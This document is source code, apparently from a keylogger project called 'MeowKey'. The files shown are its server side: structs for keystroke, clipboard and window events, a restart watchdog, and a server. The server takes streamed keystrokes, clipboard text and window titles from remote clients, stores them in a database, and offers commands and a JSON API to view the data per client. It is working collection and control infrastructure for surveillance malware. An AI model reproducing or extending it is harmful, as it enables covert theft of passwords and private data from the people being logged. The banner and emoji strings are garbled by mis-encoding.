// }

// inline pair<string, string> parseWindowEvent(const string& data) {
//     size_t bracket_pos = data.rfind(" [");
//     if (bracket_pos != string::npos) {
//         string title = data.substr(0, bracket_pos);
//         string process = data.substr(bracket_pos + 2);
//         if (!process.empty() && process.back() == ']') {
//             process.pop_back();
//         }
//         return {title, process};
//     }
//     return {data, "Unknown"};
// }

// #endif


#ifndef EVENTS_HPP
#define EVENTS_HPP

#include <cstdint>
#include <cstring>
#include <string>
#include <chrono>
#include <openssl/sha.h>

using namespace std;

inline uint64_t getCurrentTimestamp() {
    return chrono::duration_cast<chrono::microseconds>(
        chrono::system_clock::now().time_since_epoch()
    ).count();
}

// Rename enum
enum class ServerEventType : uint8_t {
    KEYSTROKE = 1,
    CLIPBOARD = 2,
    WINDOW = 3
};

// Rename structs - add "Server" prefix
struct ServerKeystrokeEvent {
    uint64_t timestamp;
    char key[16];
    uint32_t sequence;
    uint32_t padding;
    
    ServerKeystrokeEvent() : timestamp(0), sequence(0), padding(0) {
        memset(key, 0, sizeof(key));
    }
    
    ServerKeystrokeEvent(const string& key_str, uint32_t seq) 
        : timestamp(getCurrentTimestamp()), sequence(seq), padding(0) {
        memset(key, 0, sizeof(key));
        strncpy(key, key_str.c_str(), sizeof(key) - 1);
    }
    
    string getKey() const {
        return string(key);
    }
};

struct ServerClipboardEvent {
    uint64_t timestamp;
    uint32_t content_length;
    uint8_t hash[32];
    char content[10240];
    uint32_t padding;
    
    ServerClipboardEvent() : timestamp(0), content_length(0), padding(0) {
        memset(hash, 0, sizeof(hash));
        memset(content, 0, sizeof(content));
    }
    
    ServerClipboardEvent(const string& text) 
        : timestamp(getCurrentTimestamp()), padding(0) {
        content_length = min((size_t)10240, text.size());
        memset(content, 0, sizeof(content));
        memcpy(content, text.c_str(), content_length);
        
        SHA256_CTX sha256;
        SHA256_Init(&sha256);
        SHA256_Update(&sha256, text.c_str(), text.size());
        SHA256_Final(hash, &sha256);
    }
    
    string getContent() const {
        return string(content, content_length);
    }
};

struct ServerWindowEvent {
    uint64_t timestamp;
    char title[256];
    char process[64];
    uint32_t padding;
    
    ServerWindowEvent() : timestamp(0), padding(0) {
        memset(title, 0, sizeof(title));
        memset(process, 0, sizeof(process));
    }
    
    ServerWindowEvent(const string& win_title, const string& proc_name) 
        : timestamp(getCurrentTimestamp()), padding(0) {
        memset(title, 0, sizeof(title));
        memset(process, 0, sizeof(process));
        strncpy(title, win_title.c_str(), sizeof(title) - 1);
        strncpy(process, proc_name.c_str(), sizeof(process) - 1);
    }
    
    string getTitle() const {
        return string(title);
    }
    
    string getProcess() const {
        return string(process);
    }
};

// Update function names
inline ServerEventType parseEventType(const string& message) {
    if (message.find("KEY: ") == 0) return ServerEventType::KEYSTROKE;
    else if (message.find("CLIPBOARD: ") == 0) return ServerEventType::CLIPBOARD;
    else if (message.find("WINDOW: ") == 0) return ServerEventType::WINDOW;
    return ServerEventType::KEYSTROKE;
}

inline string extractEventData(const string& message) {
    size_t pos = message.find(": ");
    if (pos != string::npos) {
        return message.substr(pos + 2);
    }
    return message;
}

inline pair<string, string> parseWindowEvent(const string& data) {
    size_t bracket_pos = data.rfind(" [");
    if (bracket_pos != string::npos) {
        string title = data.substr(0, bracket_pos);
        string process = data.substr(bracket_pos + 2);
        if (!process.empty() && process.back() == ']') {
            process.pop_back();
        }
        return {title, process};
    }
    return {data, "Unknown"};
}

#endif

===== FILE: ./Server/server_watchdog.cpp =====


#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <csignal>
#include <atomic>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#endif

using namespace std;

// Config
string SERVER_EXECUTABLE = "server";        // Server binary name (in same directory)
string SERVER_PORT = "8080";                // Default port if not specified
const int CHECK_INTERVAL_MS = 1000;         // How often to check (1 second)
const int RESTART_DELAY_MS = 2000;          // Wait 2 seconds before restart

// Globals
atomic<bool> running(true);
atomic<int> restart_count(0);
atomic<int> server_pid(0);
atomic<bool> server_running(false);

// Get timestamp for logs
string timestamp() {
    auto now = chrono::system_clock::now();
    auto t = chrono::system_clock::to_time_t(now);
    auto ms = chrono::duration_cast<chrono::milliseconds>(
        now.time_since_epoch()
    ) % 1000;
    
    stringstream ss;
    ss << put_time(localtime(&t), "%H:%M:%S") << "." 
       << setfill('0') << setw(3) << ms.count();
    return ss.str();
}

// Signal handler
void handle_signal(int sig) {
    cout << "[" << timestamp() << "] Signal " << sig << " received" << endl;
    running = false;
}

#ifdef _WIN32
// Windows process functions
bool start_server_win() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    string cmd = SERVER_EXECUTABLE + " " + SERVER_PORT;
    char* cmd_cstr = new char[cmd.size() + 1];
    strcpy(cmd_cstr, cmd.c_str());
    
    if (!CreateProcess(
        NULL,
        cmd_cstr,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        delete[] cmd_cstr;
        return false;
    }
    
    delete[] cmd_cstr;
    server_pid = pi.dwProcessId;
    server_running = true;
    return true;
}

bool check_server_win() {
    if (server_pid == 0) return false;
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, server_pid);
    if (!hProcess) return false;
    
    DWORD exitCode;
    GetExitCodeProcess(hProcess, &exitCode);
    CloseHandle(hProcess);
    
    bool is_alive = (exitCode == STILL_ACTIVE);
    server_running = is_alive;
    return is_alive;
}

void kill_server_win() {
    if (server_pid == 0) return;
    
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, server_pid);
    if (hProcess) {
        TerminateProcess(hProcess, 0);
        WaitForSingleObject(hProcess, 5000);
        CloseHandle(hProcess);
    }
}

#else
// Linux/Unix process functions
bool start_server_unix() {
    pid_t pid = fork();
    
    if (pid < 0) {
        return false;
    }
    
    if (pid == 0) {
        // Child process: start server
        execl(
            SERVER_EXECUTABLE.c_str(),
            SERVER_EXECUTABLE.c_str(),
            SERVER_PORT.c_str(),
            (char*)NULL
        );
        // If we get here, exec failed
        cerr << "[" << timestamp() << "] exec failed: " << strerror(errno) << endl;
        exit(1);
    }
    
    server_pid = pid;
    server_running = true;
    return true;
}

bool check_server_unix() {
    if (server_pid <= 0) return false;
    
    // Use waitpid with WNOHANG to check if process is still running
    // This also detects zombies and cleans them up
    int status;
    pid_t result = waitpid(server_pid, &status, WNOHANG);
    
    if (result == 0) {
        // Process is still running
        return true;
    } else if (result == server_pid) {
        // Process has exited or is a zombie - it's dead
        return false;
    } else {
        // Process doesn't exist (result == -1, errno == ECHILD)
        return false;
    }
}

void kill_server_unix() {
    if (server_pid <= 0) return;
    
    kill(server_pid, SIGTERM);
    
    // Wait a bit for graceful shutdown
    for (int i = 0; i < 10; i++) {
        if (!check_server_unix()) break;
        this_thread::sleep_for(chrono::milliseconds(100));
    }
    
    // Force kill if still running
    if (check_server_unix()) {
        kill(server_pid, SIGKILL);
    }
    
    // Clean up zombie
    waitpid(server_pid, nullptr, 0);
}
#endif

// Platform-specific wrappers
bool start_server() {
#ifdef _WIN32
    return start_server_win();
#else
    return start_server_unix();
#endif
}

bool check_server() {
#ifdef _WIN32
    return check_server_win();
#else
    return check_server_unix();
#endif
}

void kill_server() {
#ifdef _WIN32
    kill_server_win();
#else
    kill_server_unix();
#endif
}

void print_usage(const char* prog_name) {
    cout << "Usage: " << prog_name << " [PORT]" << endl;
    cout << "  PORT: Server port number (default: 8080)" << endl;
    cout << endl;
    cout << "Examples:" << endl;
    cout << "  " << prog_name << "           # Uses port 8080" << endl;
    cout << "  " << prog_name << " 3000      # Uses port 3000" << endl;
    cout << "  " << prog_name << " 8081      # Uses port 8081" << endl;
}

void print_banner() {
    cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
    cout << "â•‘       MEOWKEY SERVER WATCHDOG (v1.0)            â•‘" << endl;
    cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
    cout << "â•‘ Server: " << SERVER_EXECUTABLE;
    for (int i = 0; i < 38 - SERVER_EXECUTABLE.length(); i++) cout << " ";
    cout << "â•‘" << endl;
    cout << "â•‘ Port: " << SERVER_PORT;
    for (int i = 0; i < 40 - SERVER_PORT.length(); i++) cout << " ";
    cout << "â•‘" << endl;
    cout << "â•‘                                                  â•‘" << endl;
    cout << "â•‘ Press Ctrl+C to stop watchdog AND server         â•‘" << endl;
    cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;
    cout << endl;
}

int main(int argc, char* argv[]) {
    // Parse command line arguments
    if (argc > 1) {
        // Check for help
        if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        }
        
        // Set port from command line
        SERVER_PORT = argv[1];
        
        // Validate port
        try {
            int port = stoi(SERVER_PORT);
            if (port < 1 || port > 65535) {
                cerr << "Error: Port must be between 1 and 65535" << endl;
                return 1;
            }
        } catch (...) {
            cerr << "Error: Invalid port number: " << SERVER_PORT << endl;
            return 1;
        }
    }
    
    // Setup signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    print_banner();
    
    cout << "[" << timestamp() << "] Watchdog starting..." << endl;
    cout << "[" << timestamp() << "] Starting server on port " << SERVER_PORT << "..." << endl;
    
    // Initial server start
    if (!start_server()) {
        cerr << "[" << timestamp() << "] ERROR: Failed to start server!" << endl;
        return 1;
    }
    
    cout << "[" << timestamp() << "] Server started (PID: " << server_pid << ")" << endl;
    cout << "[" << timestamp() << "] Monitoring..." << endl;
    
    // Main watchdog loop
    while (running) {
        // Check if server is still running
        bool alive = check_server();
        
        if (!alive && server_running) {
            // Server just died
            cout << "[" << timestamp() << "] Server crashed!" << endl;
            restart_count++;
            
            // Wait before restart
            cout << "[" << timestamp() << "] Waiting " 
                 << (RESTART_DELAY_MS / 1000.0) << " seconds..." << endl;
            this_thread::sleep_for(chrono::milliseconds(RESTART_DELAY_MS));
            
            // Restart server
            cout << "[" << timestamp() << "] Restarting server (attempt #" 
                 << restart_count << ")..." << endl;
            
            if (!start_server()) {
                cerr << "[" << timestamp() << "] ERROR: Restart failed!" << endl;
                this_thread::sleep_for(chrono::milliseconds(5000));
                continue;
            }
            
            cout << "[" << timestamp() << "] Server restarted (PID: " 
                 << server_pid << ")" << endl;
            server_running = true;  // Mark as running after successful restart
        }
        
        // Wait before next check
        this_thread::sleep_for(chrono::milliseconds(CHECK_INTERVAL_MS));
    }
    
    // Clean shutdown
    cout << "\n[" << timestamp() << "] Shutting down watchdog..." << endl;
    cout << "[" << timestamp() << "] Stopping server..." << endl;
    
    kill_server();
    
    cout << "[" << timestamp() << "] Server stopped" << endl;
    cout << "[" << timestamp() << "] Total restarts: " << restart_count << endl;
    cout << "[" << timestamp() << "] Watchdog stopped" << endl;
    
    return 0;
}

===== FILE: ./Server/server_main.cpp =====

#include "server_cross.hpp"
#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

void printUsage() {
    cout << "Usage: ./server <port> [storage_file]" << endl;
    cout << "Example: ./server 8080" << endl;
    cout << "         ./server 8080 meowkey_server.db" << endl;
}

int main(int argc, char* argv[]) {
    if (argc < 2 || argc > 3) {
        printUsage();
        return 1;
    }

    int port = stoi(argv[1]);
    string storage_file = (argc == 3) ? argv[2] : "meowkey_server.db";

    try {
        Server server(port, storage_file);
        
        if (!server.start()) {
            cerr << "âŒ Failed to start server" << endl;     
            return 1; 
        }
        
        server.runCommandLoop();
        
    } catch (const exception& e) {
        cerr << "âŒ Error: " << e.what() << endl;
        return 1;
    }

    return 0;
}

===== FILE: ./Server/server_cross.hpp =====



#ifndef SERVER_CROSS_HPP
#define SERVER_CROSS_HPP

#include "../socket_utils_cross.hpp"
#include "../meowkey_database.hpp"
#include "api_server.hpp"
#include <thread>
#include <atomic>
#include <unordered_map>
#include <mutex>
#include <deque>
#include <sstream>
#include <iostream>
#include <memory>
#include <iomanip>
#include <chrono>
#include <cstring>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <sstream>

#ifdef _WIN32
#include <winsock2.h>
#include <direct.h>
#define getcwd _getcwd
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#endif

using namespace std;

class ClientHandler
{
private:
   
bool in_clipboard_ = false;
string clipboard_buffer_;
uint64_t clipboard_ts_ = 0;


    int client_socket_;
    atomic<bool> running_;
    thread handler_thread_;
    string client_id_;
    uint32_t client_hash_;
    shared_ptr<MeowKeyDatabase> db_;

    deque<string> recent_events_;
    static mutex display_mutex_;

    atomic<int> events_since_sync_;
    static const int SYNC_INTERVAL = 10;

    void displayRecentEvents()
    {
        lock_guard<mutex> lock(display_mutex_);
        cout << "\n=== " << client_id_ << string(45 - client_id_.length(), '-') << "===" << endl;
        if (recent_events_.empty())
        {
            cout << "| (No events)" << string(47, ' ') << "|" << endl;
        }
        else
        {
            for (const auto &e : recent_events_)
            {
                cout << "| " << left << setw(50) << e.substr(0, 50) << "|" << endl;
            }
        }
        cout << string(60, '=') << endl;
    }

    void pushRecent(const string &s)
    {
        lock_guard<mutex> lock(display_mutex_);
        recent_events_.push_back(s);
        if (recent_events_.size() > 20)
            recent_events_.pop_front();
    }



    void processEventLine(const string &line)
{
    if (line.empty())
        return;

    uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();
    string msg = line;

    // Remove trailing whitespace
    while (!msg.empty() && (msg.back() == '\n' || msg.back() == '\r'))
        msg.pop_back();
    if (msg.empty())
        return;

    try
    {
        if (msg.rfind("KEY:", 0) == 0)
        {
            string key = msg.substr(4);
            if (!key.empty() && key[0] == ' ')
                key.erase(0, 1);

            KeystrokeEvent ke(ts, client_hash_, key);
            db_->insertKeystroke(client_hash_, ke);

            pushRecent("[KEY] " + key);
            cout << "âœ“ Keystroke: " << key << endl;
        }
        else if (msg.rfind("CLIPBOARD:", 0) == 0)
        {
            string content = msg.substr(10);
            if (!content.empty() && content[0] == ' ')
                content.erase(0, 1);

            // Save the header line itself as a clipboard event
            ClipboardEvent ce(ts, client_hash_, content);
            db_->insertClipboard(client_hash_, ce);

            string preview = content.substr(0, 30);
            if (content.size() > 30)
                preview += "...";

            pushRecent("[CLIP] " + preview);
            cout << "âœ“ Clipboard: " << preview << endl;

            // Now, next lines coming in will also be saved as clipboard if they don't start with [KEY/WINDOW/CLIPBOARD]
            in_clipboard_ = true;
        }
        else if (msg.rfind("WINDOW:", 0) == 0)
        {
            string window = msg.substr(7);
            if (!window.empty() && window[0] == ' ')
                window.erase(0, 1);

            string title = window;
            string process = "Unknown";
            size_t br = window.rfind(" [");
            if (br != string::npos && window.back() == ']')
            {
                title = window.substr(0, br);
                process = window.substr(br + 2, window.size() - br - 3);
            }

            WindowEvent we(ts, client_hash_, title, process);
            db_->insertWindow(client_hash_, we);

            pushRecent("[WIN] " + title.substr(0, 30));
            cout << "âœ“ Window: " << title.substr(0, 30) << endl;

            in_clipboard_ = false;
        }
        else
        {
            if (in_clipboard_)
            {
                // Treat raw line as a clipboard continuation
                ClipboardEvent ce(ts, client_hash_, msg);
                db_->insertClipboard(client_hash_, ce);

                string preview = msg.substr(0, 30);
                if (msg.size() > 30)
                    preview += "...";

                pushRecent("[CLIP] " + preview);
                cout << "âœ“ Clipboard (continued): " << preview << endl;
            }
            else
            {
                // Treat raw line as keystroke
                KeystrokeEvent ke(ts, client_hash_, msg);
                db_->insertKeystroke(client_hash_, ke);

                pushRecent("[KEY] " + msg);
                cout << "âœ“ Keystroke (raw): " << msg << endl;
            }
        }

        displayRecentEvents();

        // Periodic sync
        events_since_sync_++;
        if (events_since_sync_ >= SYNC_INTERVAL)
        {
            db_->syncToDisk();
            events_since_sync_ = 0;
        }
    }
    catch (const exception &e)
    {
        cerr << "âŒ Error: " << e.what() << endl;
    }
}


    // void processEventLine(const string &line)
    // {
    //     if (line.empty())
    //         return;

    //     uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();
    //     string msg = line;

    //     // Remove trailing whitespace
    //     while (!msg.empty() && (msg.back() == '\n' || msg.back() == '\r'))
    //         msg.pop_back();
    //     if (msg.empty())
    //         return;

    //     try
    //     {
    //         if (msg.rfind("KEY:", 0) == 0)
    //         {
    //             string key = msg.substr(4);
    //             if (!key.empty() && key[0] == ' ')
    //                 key.erase(0, 1);

    //             KeystrokeEvent ke(ts, client_hash_, key);
    //             db_->insertKeystroke(client_hash_, ke);

    //             pushRecent("[KEY] " + key);
    //             cout << "âœ“ Keystroke: " << key << endl;
    //         }
    //         else if (msg.rfind("CLIPBOARD:", 0) == 0)
    //         {
    //             string content = msg.substr(10);
    //             if (!content.empty() && content[0] == ' ')
    //                 content.erase(0, 1);

    //             ClipboardEvent ce(ts, client_hash_, content);
    //             db_->insertClipboard(client_hash_, ce);

    //             string preview = content.substr(0, 30);
    //             if (content.size() > 30)
    //                 preview += "...";
    //             pushRecent("[CLIP] " + preview);
    //             cout << "âœ“ Clipboard: " << preview << endl;
    //         }
    //         else if (msg.rfind("WINDOW:", 0) == 0)
    //         {
    //             string window = msg.substr(7);
    //             if (!window.empty() && window[0] == ' ')
    //                 window.erase(0, 1);

    //             string title = window;
    //             string process = "Unknown";
    //             size_t br = window.rfind(" [");
    //             if (br != string::npos && window.back() == ']')
    //             {
    //                 title = window.substr(0, br);
    //                 process = window.substr(br + 2, window.size() - br - 3);
    //             }

    //             WindowEvent we(ts, client_hash_, title, process);
    //             db_->insertWindow(client_hash_, we);

    //             pushRecent("[WIN] " + title.substr(0, 30));
    //             cout << "âœ“ Window: " << title.substr(0, 30) << endl;
    //         }
    //         else
    //         {
    //             // Treat as keystroke
    //             KeystrokeEvent ke(ts, client_hash_, msg);
    //             db_->insertKeystroke(client_hash_, ke);
    //             pushRecent("[KEY] " + msg);
    //             cout << "âœ“ Keystroke (raw): " << msg << endl;
    //         }

    //         displayRecentEvents();

    //         // Periodic sync
    //         events_since_sync_++;
    //         if (events_since_sync_ >= SYNC_INTERVAL)
    //         {
    //             db_->syncToDisk();
    //             events_since_sync_ = 0;
    //         }
    //     }
    //     catch (const exception &e)
    //     {
    //         cerr << "âŒ Error: " << e.what() << endl;
    //     }
    // }


    
    void clientLoop()
    {
        char buffer[4096];
        string leftover;

        cout << "ðŸ‘‚ Client " << client_id_ << " connected" << endl;

        while (running_)
        {
            ssize_t received = recv(client_socket_, buffer, sizeof(buffer) - 1, 0);
            if (received <= 0)
            {
                if (received == 0)
                    cout << "ðŸ”Œ Client " << client_id_ << " disconnected" << endl;
                else
                    cerr << "âŒ recv error: " << errno << endl;
                break;
            }

            buffer[received] = '\0';
            string data = leftover + string(buffer);
            leftover.clear();

            istringstream stream(data);
            string line;
            while (getline(stream, line))
            {
                if (stream.eof() && !data.empty() && data.back() != '\n')
                {
                    leftover = line;
                    break;
                }
                if (!line.empty())
                    processEventLine(line);
            }
        }

        // Final sync
        cout << "ðŸ’¾ Final sync for " << client_id_ << endl;
        db_->syncToDisk();
        cout << "âœ… " << client_id_ << " disconnected" << endl;
    }

public:
    ClientHandler(int sock, const string &id, shared_ptr<MeowKeyDatabase> db)
        : client_socket_(sock), running_(false), client_id_(id),
          db_(db), events_since_sync_(0)
    {
        client_hash_ = ClientRecord::hashString(client_id_);
    }

    ~ClientHandler() { stop(); }

    int getSocket() const { return client_socket_; }

    void start()
    {
        running_ = true;
        handler_thread_ = thread([this]
                                 { clientLoop(); });
    }

    void stop()
    {
        if (!running_)
            return;
        running_ = false;

#ifdef _WIN32
        shutdown(client_socket_, SD_BOTH);
        closesocket(client_socket_);
#else
        shutdown(client_socket_, SHUT_RDWR);
        close(client_socket_);
#endif

        if (handler_thread_.joinable())
            handler_thread_.join();
        cout << "[Handler stopped: " << client_id_ << "]" << endl;
    }

    string getClientId() const { return client_id_; }
    bool isRunning() const { return running_; }
};

mutex ClientHandler::display_mutex_;



class Server
{
private:
    int port_;
    int server_socket_;
    atomic<bool> running_;
    thread accept_thread_;

    unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
    unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
    mutex clients_mutex_;

    shared_ptr<MeowKeyDatabase> db_;
    string db_file_;

    APIServer api_server_;
    thread api_command_thread_;

    // For capturing command output
    stringstream command_output_;
    mutex output_mutex_;
    string current_cmd_id_;

    string readHandshakeLine(int sock)
    {
        char buffer[1024];
        ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0)
            return "";

        buffer[received] = '\0';
        string line(buffer);
        size_t end = line.find_first_of("\r\n");
        if (end != string::npos)
            line = line.substr(0, end);
        return line;
    }



    // Capture cout output
    class OutputCapturer
    {
    private:
        streambuf *old_cout_;
        stringstream buffer_;

    public:
        OutputCapturer() : old_cout_(cout.rdbuf())
        {
            cout.rdbuf(buffer_.rdbuf());
        }

        ~OutputCapturer()
        {
            cout.rdbuf(old_cout_);
        }

        string getOutput()
        {
            return buffer_.str();
        }
    };

public:
    void captureOutput(const string &cmd, const function<void()> &action)
    {
        stringstream buffer;
        streambuf *old_cout = cout.rdbuf(buffer.rdbuf());

        try
        {
            action();
        }
        catch (...)
        {
            cout.rdbuf(old_cout);
            throw;
        }

        cout.rdbuf(old_cout);

        // Store output if this is from API
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << buffer.str();
            cout << "ðŸ“ Captured output for " << current_cmd_id_ << ": "
                 << buffer.str().length() << " chars" << endl;
        }
    }

    void processCommand(const string &cmd)
    {
        istringstream iss(cmd);
        string command;
        iss >> command;

        // Use captureOutput for API commands
        if (!current_cmd_id_.empty())
        {
            captureOutput(cmd, [&]()
                          { processCommandInternal(command, iss); });
        }
        else
        {
            processCommandInternal(command, iss);
        }
    }

    void processCommandInternal(const string &command, istringstream &iss)
    {
        if (command == "accept")
        {
            string id;
            if (iss >> id)
                acceptClient(id);
            else
                cout << "Usage: accept <id>" << endl;
        }
        else if (command == "reject")
        {
            string id;
            if (iss >> id)
                rejectClient(id);
            else
                cout << "Usage: reject <id>" << endl;
        }
        else if (command == "kick")
        {
            string id;
            if (iss >> id)
                kickClient(id);
            else
                cout << "Usage: kick <id>" << endl;
        }
        else if (command == "list")
        {
            listClients();
        }
        else if (command == "clients")
        {
            showAllClients();
        }
        else if (command == "view")
        {
            string id, type = "all";
            if (iss >> id)
            {
                iss >> type;
                viewClientData(id, type);
            }
            else
            {
                cout << "Usage: view <id> [ks|clip|win|all]" << endl;
            }
        }
        else if (command == "stats")
        {
            db_->printStats();
        }
        else if (command == "flush")
        {
            db_->syncToDisk();
            cout << "âœ… Database synced" << endl;
        }
        else if (command == "delete")
        {
            string id;
            if (iss >> id)
                deleteClient(id);
            else
                cout << "Usage: delete <id>" << endl;
        }
        else if (command == "help")
        {
            printBanner();
        }
        else if (command == "quit" || command == "exit")
        {
            stop();
        }
        else
        {
            cout << "Unknown command. Type 'help'." << endl;
        }
    }

    Server(int port, const string &db_file = "meowkey_server.db")
        : port_(port), server_socket_(-1), running_(false),
          db_file_(db_file), api_server_(3002)
    {
        db_ = make_shared<MeowKeyDatabase>(db_file_);
        if (!db_->open())
        {
            throw runtime_error("Failed to open database");
        }
        cout << "âœ… Database: " << db_file_ << endl;
        db_->printStats();
    }

    ~Server() { stop(); }

    bool start()
    {
        if (running_)
            return false;
        running_ = true;

        // Start API server first
        api_server_.start();

        // Start processing API commands
        api_command_thread_ = thread(&Server::processAPICommands, this);

        server_socket_ = SocketUtils::createSocket();
        SocketUtils::bindSocket(server_socket_, port_);
        SocketUtils::listenSocket(server_socket_);

        accept_thread_ = thread(&Server::acceptLoop, this);
        printBanner();
        return true;
    }

    void stop()
    {
        cout << "\nâ¹ï¸  Shutting down server..." << endl;
        running_ = false;

        // Stop API server
        api_server_.stop();

        if (api_command_thread_.joinable())
        {
            api_command_thread_.join();
        }

        if (server_socket_ >= 0)
        {
#ifdef _WIN32
            closesocket(server_socket_);
#else
            shutdown(server_socket_, SHUT_RDWR);
            close(server_socket_);
#endif
            server_socket_ = -1;
        }

        if (accept_thread_.joinable())
            accept_thread_.join();

        {
            lock_guard<mutex> lock(clients_mutex_);
            // Stop all active clients FIRST to flush their data
            for (auto &p : active_clients_)
            {
                cout << "ðŸ’¾ Flushing data for client: " << p.first << endl;
                p.second->stop(); // Each client syncs its data
            }
            active_clients_.clear();

            // Stop pending clients
            for (auto &p : pending_clients_)
                p.second->stop();
            pending_clients_.clear();
        }

        // Now safe to sync DB and close file
        if (db_)
        {
            cout << "ðŸ’¾ Final database sync to disk..." << endl;
            db_->syncToDisk();
            db_->close(); // Close FD AFTER syncing
        }

        SocketUtils::cleanupWSA();
        cout << "âœ… Server shutdown complete" << endl;
    }

    void runCommandLoop()
    {
        string line;
        while (running_)
        {
            cout << "meowkey> ";
            if (!getline(cin, line))
                break;
            if (line.empty())
                continue;
            processCommand(line);
        }
    }

private:
    void printBanner()
    {
        cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
        cout << "â•‘        ðŸ± MEOWKEY SERVER - LIVE MONITORING ðŸ±             â•‘" << endl;
        cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
        cout << "â•‘ Status: RUNNING                                           â•‘" << endl;
        cout << "â•‘ Port: " << port_ << string(46 - to_string(port_).length(), ' ') << "â•‘" << endl;
        cout << "â•‘ Database: " << db_file_ << string(41 - db_file_.length(), ' ') << "â•‘" << endl;
        cout << "â•‘ JSON API: http://localhost:3002                           â•‘" << endl;
        cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
        cout << "â•‘ COMMANDS:                                                 â•‘" << endl;
        cout << "â•‘   accept <id>      - Accept pending client                â•‘" << endl;
        cout << "â•‘   reject <id>      - Reject pending client                â•‘" << endl;
        cout << "â•‘   kick <id>        - Disconnect active client             â•‘" << endl;
        cout << "â•‘   list             - Show active/pending clients          â•‘" << endl;
        cout << "â•‘   clients          - Show all registered clients          â•‘" << endl;
        cout << "â•‘   view <id> <type> - View client data (ks/clip/win/all)   â•‘" << endl;
        cout << "â•‘   flush            - Flush all data to disk               â•‘" << endl;
        cout << "â•‘   delete <id>      - Delete client and all data           â•‘" << endl;
        cout << "â•‘   stats            - Show database statistics             â•‘" << endl;
        cout << "â•‘   help             - Show this help                      â•‘" << endl;
        cout << "â•‘   quit             - Stop server                         â•‘" << endl;
        cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n"
             << endl;
    }

    void processAPICommands()
    {
        cout << "ðŸ”„ Starting API command processor..." << endl;

        while (running_)
        {
            string cmd_with_id = api_server_.getNextCommand(100);

            if (!cmd_with_id.empty())
            {
                // Extract command ID and actual command
                size_t colon_pos = cmd_with_id.find(':');
                if (colon_pos != string::npos)
                {
                    string cmd_id = cmd_with_id.substr(0, colon_pos);
                    string cmd = cmd_with_id.substr(colon_pos + 1);

                    cout << "ðŸ“¨ API Command [" << cmd_id << "]: " << cmd << endl;

                    // Capture output for this command
                    {
                        lock_guard<mutex> lock(output_mutex_);
                        current_cmd_id_ = cmd_id;
                        command_output_.str(""); // Clear previous output
                        command_output_.clear();
                    }

                    // Process the command
                    processCommand(cmd);

                    // Get the captured output
                    string output;
                    {
                        lock_guard<mutex> lock(output_mutex_);
                        output = command_output_.str();
                        current_cmd_id_ = "";
                    }

                    // Store result in API server
                    api_server_.storeResult(cmd_id, output);

                    cout << "âœ… API command processed: " << cmd << endl;
                }
            }

            this_thread::sleep_for(chrono::milliseconds(100));
        }
    }

    void acceptLoop()
    {
        cout << "ðŸ”Š Listening on port " << port_ << "..." << endl;

        while (running_)
        {
            int client_sock = accept(server_socket_, nullptr, nullptr);
            if (client_sock < 0)
            {
#ifdef _WIN32
                if (WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    this_thread::sleep_for(chrono::milliseconds(100));
                    continue;
                }
#else
                if (errno == EAGAIN || errno == EWOULDBLOCK)
                {
                    this_thread::sleep_for(chrono::milliseconds(100));
                    continue;
                }
#endif
                cerr << "âŒ Accept error: " << errno << endl;
                continue;
            }

            string handshake = readHandshakeLine(client_sock);
            if (handshake.empty())
            {
#ifdef _WIN32
                closesocket(client_sock);
#else
                close(client_sock);
#endif
                continue;
            }

            string client_id;
            size_t colon = handshake.find(':');
            if (colon != string::npos)
            {
                client_id = handshake.substr(colon + 1);
                // Trim whitespace
